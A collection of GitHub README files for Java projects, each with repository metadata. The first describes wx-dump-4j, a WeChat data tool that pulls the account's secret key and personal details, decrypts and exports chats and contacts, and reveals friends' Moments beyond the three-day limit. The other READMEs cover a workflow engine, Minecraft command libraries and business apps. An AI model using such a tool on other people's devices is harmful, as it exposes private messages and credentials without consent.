	<a href=""https://hellogithub.com/repository/5055dcceee434dc5851ac9897cb27396"" target=""_blank""><img src=""https://api.hellogithub.com/v1/widgets/recommend.svg?rid=5055dcceee434dc5851ac9897cb27396&claim_uid=AVv4KeNnZs2Ig3a"" alt=""Featured｜HelloGitHub"" style=""width: 250px; height: 54px;"" width=""250"" height=""54"" /></a>
</p>

<p align=""center"">
	<a href=""https://github.com/xuchengsheng/spring-reading/stargazers""><img src=""https://img.shields.io/github/stars/xuchengsheng/wx-dump-4j?logo=github&logoColor=%23EF2D5E&label=Stars&labelColor=%23000000&color=%23EF2D5E&cacheSeconds=3600"" alt=""Stars Badge""/></a>
    <a href=""https://github.com/xuchengsheng""><img src=""https://img.shields.io/github/followers/xuchengsheng?label=Followers&logo=github&logoColor=%23FC521F&labelColor=%231A2477&color=%23FC521F&cacheSeconds=3600"" alt=""Follow Badge""></a>
    <a href=""https://github.com/xuchengsheng/wx-dump-4j/fork""><img src=""https://img.shields.io/github/forks/xuchengsheng/wx-dump-4j?label=Forks&logo=github&logoColor=%23F2BB13&labelColor=%23BE2323&color=%23F2BB13"" alt=""Fork Badge""></a>
    <a href=""https://github.com/xuchengsheng/wx-dump-4j/watchers""><img src=""https://img.shields.io/github/watchers/xuchengsheng/wx-dump-4j?label=Watchers&logo=github&logoColor=%23FF4655&labelColor=%234169E1&color=%23FF4655&cacheSeconds=3600"" alt=""Watchers Badge""></a> 
</p>

<p align=""center"">
	<img src=""https://img.shields.io/badge/Java-11%2B-%23437291?logo=openjdk&logoColor=%23437291""/>
    <img src=""https://img.shields.io/badge/Spring-5.3.10-%23437291?logo=Spring&logoColor=%236DB33F&color=%236DB33F""/>
    <img src=""https://img.shields.io/badge/SpringBoot-2.5.5-%23437291?logo=SpringBoot&logoColor=%236DB33F&color=%236DB33F""/>
    <img src=""https://img.shields.io/badge/JNA-5.8.0-%23437291?logo=JNA&logoColor=%23228B22&color=%23228B22""/>
    <img src=""https://img.shields.io/badge/Hutool-5.8.16-%23437291?logo=JNA&logoColor=%23F08080&color=%23F08080""/>
    <img src=""https://img.shields.io/badge/easyexcel-5.8.16-%23437291?logo=JNA&logoColor=%23D2691E&color=%23D2691E""/>
    <img src=""https://img.shields.io/badge/protobuf-3.25.1-%23437291?logo=JNA&logoColor=%23800080&color=%23800080""/>
    <img src=""https://img.shields.io/badge/mapstruct-1.4.2-%23437291?logo=JNA&logoColor=%23DC143C&color=%23DC143C""/>
    <img src=""https://img.shields.io/badge/druid-1.2.20-%23437291?logo=JNA&logoColor=%23C71585&color=%23C71585""/>
    <img src=""https://img.shields.io/badge/mybatisPlus-3.5.4.1-%23437291?logo=JNA&logoColor=%234B0082&color=%234B0082""/>
    <img src=""https://img.shields.io/badge/sqlite-3.34.0-%23437291?logo=JNA&logoColor=%230000CD&color=%230000CD""/>
    <img src=""https://img.shields.io/badge/lombok-1.18.20-%23437291?logo=JNA&logoColor=%23008B8B&color=%23008B8B""/>
</p>

-------------------------------------------------------------------------------

## 📚 简介

wx-dump-4j是一款基于Java开发的微信数据分析工具。它准确显示好友数、群聊数和当日消息总量，提供过去15天每日消息统计，了解社交活跃度。识别展示最近一个月内互动频繁的前10位联系人。支持导出聊天记录、联系人、群聊信息，及查看**超过三天限制的朋友圈**历史记录和**找回微信好友**。

## 💡 主要功能

- 👤 **获取用户信息**：获取当前登录微信的详细信息，包括昵称、账号、手机号、邮箱、秘钥、微信Id。
- 💬 **支持多种消息类型**：管理微信聊天对话中的文本、引用、图片、表情、卡片链接、系统消息等。
- 📊 **综合管理**：提供微信会话、联系人、群聊与朋友圈的全面管理功能。
- 📥 **记录导出**：支持导出微信聊天记录、联系人、已删除好友和群聊信息，便于备份和管理。
- 📅 **查看历史朋友圈**：突破三日限制，查看更久以前的朋友圈历史记录，方便回顾和管理。
- 📈 **微信统计功能**：展示微信好友数、群聊数及今日收发消息总量，了解社交活跃度。
- 📊 **消息统计**：统计过去15天内每日微信消息数量，掌握长期消息交流情况。
- 🔝 **互动联系人**：展示最近一个月互动最频繁的前10位联系人，了解重要社交联系。
- 🧩 **消息类别占比**：展示微信消息类别占比图表，分析不同类型消息的占比情况。
- ☁️ **关键字词云**：展示微信最近使用的关键字词云图，分析聊天内容重点。
- 🔄 **找回已删除好友**：支持找回已删除的微信好友，恢复重要联系人。
- 🖥️ **微信多开支持**：支持微信多开功能，方便管理多个账号，提高效率。

## 🚀 快速启动

本指南将帮助您快速启动并运行项目，无论是安装包部署还是本地部署。

### 环境准备

在开始之前，请确保您的开发环境满足以下要求：

- 安装 [Java](https://repo.huaweicloud.com/java/jdk/11.0.2+9/jdk-11.0.2_windows-x64_bin.exe)，版本为 JDK 11+。
- 安装 [Node.js](https://nodejs.org/en/)，版本为 18+。
- 安装 [Maven](https://maven.apache.org/download.cgi)，版本为 3.5.0+。
- 选择一款开发工具，比如 IntelliJ IDEA。

### 二进制部署

- 点击下载最新版 [wx-dump-4j-bin.tar.gz](https://github.com/xuchengsheng/wx-dump-4j/releases/download/v1.1.0/wx-dump-4j-bin.tar.gz)。

- 解压缩 `wx-dump-4j-bin.tar.gz` 文件，并进入 `bin` 目录。

- 双击 `start.bat` 启动文件。

- 启动成功后，在浏览器中访问 [http://localhost:8080](http://localhost:8080) 以查看应用。

### 本地部署

- 下载源码：
   ```bash
   $ git clone https://github.com/xuchengsheng/wx-dump-4j.git
   ```
- 安装后端依赖：
   ```bash
   $ cd wx-dump-4j mvn clean install
   ```
- 使用开发工具（如 IntelliJ IDEA）启动 com.xcs.wx.WxDumpApplication。
- 安装前端依赖：
   ```bash
   $ cd wx-dump-ui npm install
   ```
- 启动前端服务：
   ```bash
   $ npm run start
   ```
- 前端服务启动成功后，在浏览器中访问 http://localhost:8000 以查看应用。

## ⚡ 技术栈
以下是本项目使用的技术栈：

| 技术         | 描述                      | 版本      |
|--------------|---------------------------|-----------|
| Spring Boot  | Web 和 Thymeleaf 框架     | 2.7.15    |
| SQLite       | 轻量级数据库              | 3.34.0    |
| Lombok       | 简化 Java 代码            | 1.18.20   |
| MyBatis Plus | ORM 框架扩展              | 3.5.4.1   |
| Dynamic Datasource | 动态数据源管理         | 4.2.0     |
| Druid        | 数据库连接池              | 1.2.20    |
| MapStruct    | Java Bean 映射工具        | 1.4.2.Final |
| Hutool       | Java 工具库               | 5.8.16    |
| JNA          | Java 本地访问             | 5.8.0     |
| Protobuf     | 序列化框架                | 3.25.1    |
| gRPC         | RPC 框架                  | 1.11.0    |
| EasyExcel    | Excel 操作工具            | 3.3.3     |
| Commons Compress | 压缩和解压缩工具    | 1.19      |
| Jackson Dataformat XML | XML 解析工具  | 2.13.5    |
| Commons Lang3 | 常用工具类库             | 3.12.0    |

## ⛔️️ 使用限制
本软件仅适用于Windows操作系统。我们目前不支持macOS、Linux或其他操作系统。如果你在尝试在非Windows系统上运行本软件时可能遇到兼容性问题，这些问题可能导致软件无法正常运行或产生其他意外后果。

| 操作系统 | 支持情况     |
|:--------:|:----------:|
| Windows  | 支持   |
| macOS    | 不支持     |
| Linux    | 不支持    |

## ⚠️免责声明

本软件仅供技术研究和教育目的使用，旨在解密用户个人微信聊天记录。严禁将本软件用于任何非法目的，包括但不限于侵犯隐私权或非授权数据访问。作为软件开发者，我不对因使用或滥用本软件产生的任何形式的损失或损害承担责任。

## ⛵欢迎贡献！

如果你发现任何错误🔍或者有改进建议🛠️，欢迎提交 issue 或者 pull request。你的反馈📢对于我非常宝贵💎！

## 💻我的 GitHub 统计

[![Star History Chart](https://api.star-history.com/svg?repos=xuchengsheng/wx-dump-4j&type=Date)](https://star-history.com/#xuchengsheng/wx-dump-4j&Date)

## 🎉Stargazers

[![Stargazers123 repo roster for @xuchengsheng/wx-dump-4j](https://reporoster.com/stars/xuchengsheng/wx-dump-4j)](https://github.com/xuchengsheng/wx-dump-4j/stargazers)

## 🎉Forkers

[![Forkers repo roster for @xuchengsheng/wx-dump-4j](https://reporoster.com/forks/xuchengsheng/wx-dump-4j)](https://github.com/xuchengsheng/wx-dump-4j/network/members)

## 🍱请我吃盒饭？

作者晚上还要写博客✍️,平时还需要工作💼,如果帮到了你可以请作者吃个盒饭🥡
<div>
<img alt=""logo"" src=""image/WeChatPay.png"" style=""width: 240px;height: 260px"">
<img alt=""logo"" src=""image/Alipay.png"" style=""width: 240px;height: 260px"">
</div>

## ⭐️扫码关注微信公众号

关注后，回复关键字📲 **加群**📲，即可加入我们的技术交流群，与更多开发者一起交流学习。

在此，我们真诚地邀请您访问我们的GitHub项目页面，如果您觉得***wx-dump-4j***对您有帮助，请顺手点个⭐️**Star**⭐️！每一颗星星都是我们前进的动力，是对我们努力的最大肯定。非常感谢您的支持！

<div>
<img alt=""logo"" src=""image/wechat-mp.png"" height=""180px"">>
</div>

## 👀 演示图

<table>
    <tr>
        <td><img src=""image/screenshot/dashboard.png""/></td>
        <td><img src=""image/screenshot/session.png""/></td>
    </tr>
    <tr>
        <td><img src=""image/screenshot/contact.png""/></td>
        <td><img src=""image/screenshot/recover-contact.png""/></td>
    </tr>
    <tr>
        <td><img src=""image/screenshot/feeds.png""/></td>
        <td><img src=""image/screenshot/chat.png""/></td>
    </tr>
	<tr>
        <td><img src=""image/screenshot/chatroom.png""/></td>
        <td><img src=""image/screenshot/chatroom-detail.png""/></td>
    </tr>	 
	<tr>
        <td><img src=""image/screenshot/database.png""/></td>
        <td><img src=""image/screenshot/database-list.png""/></td>
    </tr>
</table>",2,30,1,mit,6.0
dromara/warm-flow,master,"<p align=""center"">
	<img alt=""logo"" src=""https://foruda.gitee.com/images/1726820610127990120/c8c5f3a4_2218307.png"" width=""100"">
</p>
<h1 align=""center"" style=""margin: 30px 0 30px; font-weight: bold;"">Warm-Flow工作流</h1>
<p align=""center"">
	<a href=""https://gitee.com/dromara/warm-flow/stargazers""><img src=""https://gitee.com/dromara/warm-flow/badge/star.svg?theme=dark""></a>
        <a href='https://gitee.com/dromara/warm-flow/members'><img src='https://gitee.com/dromara/warm-flow/badge/fork.svg?theme=dark' alt='fork'> 
        </img></a>
</p>



## 介绍

Warm-Flow国产工作流引擎🎉，其特点简洁轻量，五脏俱全，可扩展，是一个可通过jar引入设计器的工作流。

1. 简洁易用：只有7张表，代码量少，可快速上手和集成
2. 审批功能：支持通过、退回、任意跳转、转办、终止、会签、票签、委派和加减签、互斥和并行网关
3. 监听器与流程变量：支持四种监听器，可应对不同场景，灵活可扩展，参数传递，动态权限
4. 流程图：流程引擎自带流程图，可在不集成流程设计器情况下使用
5. 流程设计器：可通过jar包形式快速集成到项目，减少繁琐代码搬运和适配
6. 条件表达式：内置常见的和spel条件表达式，并且支持自定义扩展
7. 办理人变量表达式：内置${handler}和spel格式的表达式，可满足不同场景，灵活可扩展
8. orm框架扩展：目前支持MyBatis、Mybatis-Plus、Mybatis-Flex和Jpa，后续会由社区提供其他支持，扩展方便
9. 数据库支持：目前支持MySQL 、Oracle 和PostgreSQL，后续会继续支持其他数据库或者国产数据库
10. 多租户与软删除：流程引擎自身维护多租户和软删除实现，也可使用对应orm框架的实现方式
11. 同时支持spring和solon
12. 兼容java8和java17,理论11也可以
13. 官方提供基于ruoyi-vue封装实战项目，很实用

```shell
希望一键三连，你的⭐️ Star ⭐️是我持续开发的动力，项目也活的更长
```

>   **[github地址](https://github.com/dromara/warm-flow.git)** | **[gitee地址](https://gitee.com/dromara/warm-flow.git)** | **[gitCode地址](https://gitcode.com/dromara/warm-flow)**

## 演示地址

- admin/admin123

演示地址：http://www.hhzai.top

## 使用文档与联系方式

http://warm-flow.cn

## 组件所需脚本

- 首次导入，先创建数据库，找到对应数据库的全量脚本[warm-flow-all.sql](https://gitee.com/dromara/warm-flow/tree/master/sql/mysql)，执行
- 如果版本更新，找到对应数据库的更新版本，比如xx-upgrade，[warm-flow_x.x.x.sql](https://gitee.com/dromara/warm-flow/tree/master/sql/mysql/v1-upgrade)，执行

## 官网流程定义案例xml

[官网流程定义案例xml](https://gitee.com/dromara/warm-flow-test/tree/master/warm-flow-core-test/src/main/resources)

## 测试代码

> 测试代码[warm-flow-test](https://gitee.com/dromara/warm-flow-test)项目中，warm-flow-xxx-test模块的测类

## 支持数据库类型

* [x] mysql
* [x] oracle
* [x] postgresql
* [ ] 达梦
* [ ] 人大金仓
* [ ] GaussDB
* [ ] oceanbase
* [ ] sqlserver
* [ ] ......

## orm扩展包

* [x] mybatis
* [x] mybatis-plus
* [x] jpa
* [x] mybatis-flex
* [x] easy-query
* [ ] ......




> **有想扩展其他orm框架和数据库的可加qq群联系群主**


## 推荐

大家在使用本项目时，推荐结合贺波老师的书
[《深入Flowable流程引擎：核心原理与高阶实战》](https://item.jd.com/14804836.html)学习。这本书得到了Flowable创始人Tijs Rademakers亲笔作序推荐，对系统学习和深入掌握Flowable的用法非常有帮助。

<img src=""https://gitee.com/cai_xiao_feng/lowflow-design/raw/main/public%2Fflowable.jpg"" width=""500px""/>

## 你可以请作者喝杯咖啡表示鼓励

![输入图片说明](https://foruda.gitee.com/images/1697770422557390406/7efa04d6_2218307.png ""屏幕截图"")

## 特别感谢JetBrains对开源项目支持


<a href=""https://jb.gg/OpenSourceSupport"">
  <img src=""https://user-images.githubusercontent.com/8643542/160519107-199319dc-e1cf-4079-94b7-01b6b8d23aa6.png"" align=""left"" height=""100"" width=""100""  alt=""JetBrains"">
</a>
<br>
<br>
<br>


## git提交规范

    [init] 初始化  
    [feat] 增加新功能  
    [fix] 修复问题/BUG  
    [perf] 优化/性能提升  
    [refactor] 重构  
    [revert] 撤销修改  
    [style] 代码风格相关无影响运行结果的  
    [update] 其他修改  
    [upgrade] 升级版本  
    
",4,0,10,apache-2.0,12.0
Incendo/cloud-minecraft,master,"<div align=""center"">
<img src=""https://github.com/Incendo/cloud/raw/master/img/CloudNew.png"" width=""300px""/>
<br/>
<h1>cloud-minecraft</h1>

![license](https://img.shields.io/github/license/incendo/cloud.svg)
[![central](https://img.shields.io/maven-central/v/org.incendo/cloud-paper)](https://search.maven.org/search?q=org.incendo)
![build](https://img.shields.io/github/actions/workflow/status/incendo/cloud-minecraft/build.yml?logo=github)
[![docs](https://img.shields.io/readthedocs/incendocloud?logo=readthedocs)](https://cloud.incendo.org)
</div>

## links

- JavaDoc: https://javadoc.io/doc/org.incendo
- Docs: https://cloud.incendo.org/minecraft
- Incendo Discord: https://discord.gg/aykZu32

## modules

- cloud-brigadier: integration with [Mojang Brigadier](https://github.com/Mojang/brigadier)
- cloud-paper: integration for Bukkit-based platforms with specific support for [Paper API](https://papermc.io/software/paper)
- cloud-bukkit: integration for Bukkit-based platforms, dependency of cloud-paper
- cloud-velocity: integration for [Velocity API](https://papermc.io/software/velocity)
- cloud-sponge7: integration for [Sponge API](https://spongepowered.org) v7
- cloud-bungee: integration for Bungeecord API
- cloud-cloudburst: integration for cloudburst
- cloud-minecraft-extras: optional extras using [adventure](https://github.com/KyoriPowered/adventure) API
- cloud-minecraft-bom: [bill of materials](https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html#Importing_Dependencies) for cloud-minecraft dependencies
",10,7,8,mit,33.0
StandardSolvers/ps-code-snippets,main,"![logo](./docs/img/logo.png)


<div align=""center"">
    <a href=""https://www.apache.org/licenses/LICENSE-2.0""><img src=""https://img.shields.io/badge/license-Apache2-green.svg?style=for-the-badge"" alt=""Apache2""></a>
    <img src=""https://img.shields.io/maintenance/yes/2024?style=for-the-badge"" alt=""Maintenance"">
    <a href=""https://github.com/StandardSolvers/ps-code-snippets/graphs/contributors""><img src=""https://img.shields.io/github/contributors/StandardSolvers/ps-code-snippets?style=for-the-badge"" alt=""GitHub contributors""></a>
    <a href=""https://github.com/StandardSolvers/ps-code-snippets/contribute""><img src=""https://img.shields.io/github/issues/StandardSolvers/ps-code-snippets/good%20first%20issue?style=for-the-badge"" alt=""GitHub issues by-label""></a>        
</div>

# Problem Solving Code Snippets
- Unlock the potential of your code with the Algorithm Codesnippet.
- A unique and creative rendering of standard solvers' algorithms, showcasing the beauty and complexity of coding!

# Getting Started
## IntelliJ

# Contributing
- Contributing to ps-code-snippets is very welcome. For basic contributions, all you need is being comfortable with GitHub and Git.
- The best ways to contribute are:
    - Work on new Algorithm (Ps, Statement pair set)
    - Work on documentation
- To ensure equal and positive communication, we adhere to our [Code of Conduct](./CODE_OF_CONDUCT.md). Before starting any interactions with this repository, please read it and make sure to follow.
- Please before contributing check out our [Contributing Guide](./CONTRIBUTING.md) and issues labeled ""good first issue"": [![GitHub issues by-label](https://img.shields.io/github/issues/StandardSolvers/ps-code-snippets/good%20first%20issue?style=for-the-badge)](https://github.com/StandardSolvers/ps-code-snippets/contribute)
<br>

# Features
- Take exactly what's written in the code

![gif](./docs/img/disjoint-set.gif)

# Model
- intellij
    - completion
        - PsCompletionContributor
        - PsCompletionProvider
    - action
        - PsPopUp
    - DialogWrapper
        - PsDailogWrapper
- core
  - PsManager
  - PsProvider
- solution
  - ps
  - statement

## UML: Class Diagram
![uml](./docs/img/uml.png)




",1,0,7,apache-2.0,25.0
longerye/im-chat,master,"brief introduction:
    I have always had a social dream, I want to do an IM application, I have seen a lot of excellent
  open source projects, but there is no suitable for myself. So I used my break time to write such a system.
    IM-chat is a web version of chat software implemented in imitation of wechat, which is currently completely open source.
  Support private chat, group chat, offline message, send voice, pictures, files, emojis and other functions
  Video chat support (based on webrtc implementation, ssl certificate required) The backend uses springboot+netty,
  and the web uses vue Servers support cluster deployment, and each im-server processes only the messages of its own connected users
    Technology stack:
        Back-end frameworks: Springboot, Netty, Mybatis-plus, Swagger, Jwt
        Technical components: Mysql, Redis, Minio
        Front-end technology: Vue, Eelement-ui, Webrtc",0,0,4,mit,1.0
quarkiverse/quarkus-fx,main,"# quarkus-fx

[![Version](https://img.shields.io/maven-central/v/io.quarkiverse.fx/quarkus-fx-parent?logo=apache-maven&style=flat-square)](https://search.maven.org/artifact/io.quarkiverse.fx/quarkus-fx)

<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->
[![All Contributors](https://img.shields.io/badge/all_contributors-4-orange.svg?style=flat-square)](#contributors-)
<!-- ALL-CONTRIBUTORS-BADGE:END -->
This Quarkus extension allows you to use JavaFX in your Quarkus application. \
It will allow component injection in FX Controllers and will allow you to use CDI events to register on primary stage creation.

Please refer to documentation available at https://docs.quarkiverse.io/quarkus-fx/dev/index.html

You will be able to register on primary stage creation event via such code example.
```java
public class QuarkusFxApp {

  @Inject
  FXMLLoader fxmlLoader;

  public void start(@Observes final FxPostStartupEvent event) {
    try {
      InputStream fxml = this.getClass().getResourceAsStream(""/app.fxml"");
      Parent fxmlParent = this.fxmlLoader.load(fxml);

      Stage stage = event.getPrimaryStage();
      
      Scene scene = new Scene(fxmlParent);
      stage.setScene(scene);
      stage.show();

    } catch (IOException e) {
      // Handle error
    }
  }
}
```
To load multiple FXML files, you can use :
```java
@Inject
Instance<FXMLLoader> fxmlLoader;
```

Also, setting the location is required by some use cases (use of relative paths in FXML)
```java
FXMLLoader loader = this.fxmlLoader.get();
// Set location for relative path resolution
loader.setLocation(xxx);
```

For some sample apps and usage, check the `samples/` directory.

## Contributors ✨

Thanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/CodeSimcoe""><img src=""https://avatars.githubusercontent.com/u/110094118?v=4?s=100"" width=""100px;"" alt=""Clément de Tastes""/><br /><sub><b>Clément de Tastes</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=CodeSimcoe"" title=""Code"">💻</a> <a href=""#maintenance-CodeSimcoe"" title=""Maintenance"">🚧</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://github.com/ghazyami""><img src=""https://avatars.githubusercontent.com/u/7247810?v=4?s=100"" width=""100px;"" alt=""Ghazy Abdallah""/><br /><sub><b>Ghazy Abdallah</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=ghazyami"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""http://www.jboss.org""><img src=""https://avatars.githubusercontent.com/u/332210?v=4?s=100"" width=""100px;"" alt=""Scott M Stark""/><br /><sub><b>Scott M Stark</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=starksm64"" title=""Code"">💻</a></td>
      <td align=""center"" valign=""top"" width=""14.28%""><a href=""https://fouad.io""><img src=""https://avatars.githubusercontent.com/u/1194488?v=4?s=100"" width=""100px;"" alt=""Fouad Almalki""/><br /><sub><b>Fouad Almalki</b></sub></a><br /><a href=""https://github.com/quarkiverse/quarkus-fx/commits?author=Eng-Fouad"" title=""Code"">💻</a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome!
",4,5,2,apache-2.0,65.0
hardingadonis/saledock,main,"# Sale Dock

[![build](https://github.com/hardingadonis/saledock/actions/workflows/build.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/build.yml)
[![publish](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml)
[![release](https://github.com/hardingadonis/saledock/actions/workflows/release.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/release.yml)
[![CodeFactor](https://www.codefactor.io/repository/github/hardingadonis/saledock/badge)](https://www.codefactor.io/repository/github/hardingadonis/saledock)
![GitHub contributors](https://img.shields.io/github/contributors/hardingadonis/saledock)
![GitHub top language](https://img.shields.io/github/languages/top/hardingadonis/saledock)
![GitHub repo size](https://img.shields.io/github/repo-size/hardingadonis/saledock)
![GitHub License](https://img.shields.io/github/license/hardingadonis/saledock)

> SWP391 project, ERP system, Sales module

## Requirements

- JDK 17
- MySQL 8.2.0
- Tomcat 10
- Maven 3+

## Database

<details>
  <summary>Database</summary>

  <div style=""margin-top: 20px"">
    <a href=""https://github.com/hardingadonis/saledock"">
      <img src=""database/database.svg""/>
    </a>
  </div>
</details>

## Development

- You need to install the requirements above.

#### 1. Clone `Sale Dock`:

```bash
git clone https://github.com/hardingadonis/saledock.git
```

#### 2. Open `Sale Dock`:

- You can open `Sale Dock` with your favorite IDE:
  - [IntelliJ IDEA](https://www.jetbrains.com/idea/)
  - [Eclipse](https://www.eclipse.org/)
  - [NetBeans](https://netbeans.apache.org/)

#### 3. Build `Sale Dock` with `Maven` (Optional):

```bash
cd saledock
mvn verify
```

## Deployment

- Open Installation Guide: [Installation Guide](docs/INSTALLATION_GUIDE.md)

## Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/hardingadonis""><img src=""https://avatars.githubusercontent.com/u/34091632?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Minh Vương</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/bakaqc""><img src=""https://avatars.githubusercontent.com/u/126387856?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Đinh Quốc Chương</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/htnghia1423""><img src=""https://avatars.githubusercontent.com/u/137130942?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Thunder</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/yuhtnguyen""><img src=""https://avatars.githubusercontent.com/u/137138731?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Yuht</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/linhlm0210""><img src=""https://avatars.githubusercontent.com/u/147788973?v=4"" width=""100px;"" alt=""""/><br /><sub><b>linhlm0210</b></sub></a></td>
    </tr>
    <tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/thson58""><img src=""https://avatars.githubusercontent.com/u/152074875?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Nguyen Son</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://allcontributors.org""><img src=""https://avatars.githubusercontent.com/u/46410174?v=4"" width=""100px;"" alt=""""/><br /><sub><b>All Contributors</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://imgbot.net""><img src=""https://avatars.githubusercontent.com/u/31427850?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Imgbot</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://www.codefactor.io""><img src=""https://avatars.githubusercontent.com/u/13309880?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Automated code reviews</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AnkitaGhosh2000""><img src=""https://avatars.githubusercontent.com/u/152983487?v=4"" width=""100px;"" alt=""""/><br /><sub><b>AnkitaGhosh2000</b></sub></a></td>
	</tr>
	<tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/SaibalCts23""><img src=""https://avatars.githubusercontent.com/u/153187590?v=4"" width=""100px;"" alt=""""/><br /><sub><b>SaibalCts23</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/AdrishOfHogwarts""><img src=""https://avatars.githubusercontent.com/u/152976845?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Adrish Bose</b></sub></a></td>
    </tr>
  </tbody>
</table>

<!-- markdownlint-restore -->
<!-- prettier-ignore-end -->

<!-- ALL-CONTRIBUTORS-LIST:END -->

## Licenses:

- [Sale Dock](https://github.com/hardingadonis/saledock) is under the [Apache-2.0 license](https://github.com/hardingadonis/saledock/blob/main/LICENSE).
- [favicon](https://github.com/hardingadonis/saledock/blob/main/src/main/webapp/assets/images/favicon/favicon.png) is under the [flaticon](https://www.flaticon.com/free-icon/sale_791968).
",10,0,2,apache-2.0,113.0
begcode/begcode-admin,main,"# monolithMybatis

本应用程序由BegCode8.6.3生成, 你可以在 [https://www.begcode.com](https://www.begcode.com) 找到文档和帮助。

## 截图展示

### 登录

![登录](./doc/images/login.png)

### 首页

![首页](./doc/images/index.png)

### 菜单列表

![菜单列表](./doc/images/view_permission.png)

### 角色列表

![角色列表](./doc/images/authority.png)

### 用户列表

![用户列表](./doc/images/user-list.png)

### 短信配置

![短信配置](./doc/images/sms_config.png)

### 图片上传

![图片上传](./doc/images/upload_image.png)

### 字典管理

![字典管理](./doc/images/dictionary.png)

### 操作日志

![操作日志](./doc/images/sys_log.png)

### 消息发布

![消息发布](./doc/images/announcement.png)

### Api列表

![Api列表](./doc/images/api.png)

### Icon选择参考

![Icon选择参考](./doc/images/icon_picker.png)

### 查看通知

![查看通知](./doc/images/notice.png)

## 项目结构

生成时需要 Node，并建议在开发过程中使用它。package.json 文件始终会生成，以提供更好的开发体验，包括 prettier、commit hooks、脚本等等。

在项目的根目录中，JHipster会生成用于配置诸如git、prettier、eslint、husky等众多常见工具的配置文件。你可以在网络上找到有关这些工具的参考文档。

`/src/*` 目录结构遵循默认的Java结构。

- `.yo-rc.json` - Yeoman配置文件（BegCode/JHipster配置文件）
  BegCode的配置存储在key为generator-begcode的属性中，这里定义了BegCode生成器的全局配置。此外，你可能会在项目根目录下的.yo-rc.json文件中找到类似generator-begcode-\*的蓝图配置，它包含了项目特定的配置选项。
- `.yo-resolve` (可选) - Yeoman 冲突解决器
  允许在发现冲突时使用特定操作，跳过匹配模式的文件的提示。每一行应该匹配 [模式] [操作]，其中模式是一个 Minimatch 模式，操作是 skip（如果省略则为默认操作）或者 force 中的一个。以 # 开头的行被视为注释，将被忽略。
- `.jhipster/*.json` - JHipster实体配置文件

- `npmw` - 用于本地安装的npm的包装器
  BegCode默认使用构建工具在本地安装Node和pnpm。此包装器确保本地安装pnpm并使用它，避免了不同版本可能引起的一些差异。通过使用./npmw而不是传统的npm，您可以配置一个无需Node的环境来开发或测试您的应用程序。
- `/src/main/docker` - 应用程序及其依赖的服务的Docker配置

## 开发

    构建系统将自动安装推荐的Node和pnpm版本。
    我们提供了一个包装器来启动 pnpm。

仅当 [package.json](package.json) 中的依赖项发生更改时，您才需要再次运行此命令。

```
./npmw install
```

我们使用 pnpm 脚本和 [Vite][] 作为我们的构建系统。

在两个单独的终端中运行以下命令，以创建更好的开发体验，其中当硬盘上的文件发生更改时您的浏览器自动刷新。

```
./mvnw
./npmw start
```

Npm 还用于管理此应用程序中使用的 CSS 和 JavaScript 依赖项。 您可以通过以下方式升级依赖项
在 [package.json](package.json) 中指定较新版本。 您还可以运行`pnpm update`和`pnpm install`来管理依赖项。
在任何命令上添加`help`标志以查看如何使用它。 例如，`pnpm help update`。

`./npmw run` 命令将列出可用于该项目运行的所有脚本。

## 系统构建

### 创建Jar包

要优化monolithMybatis应用程序创建Jar包并进行生产部署，请运行：

```
./mvnw package -Pprod clean verify -DskipTests
```

这将压缩客户端和重新打包CSS和JavaScript文件。 它还将修改`index.html`，以便引用这些新文件。
为了确保一切正常，请运行：

```
java -jar target/*.jar
```

然后在浏览器打开：[http://localhost:8080](http://localhost:8080)。

请参阅[Using JHipster in production][] 了解更多详细信息。

### 创建War包

要将您的应用程序打包为 war 以便将其部署到应用程序服务器，请运行：

```
./mvnw package -Pprod,war clean verify
```

### JHipster Control Center

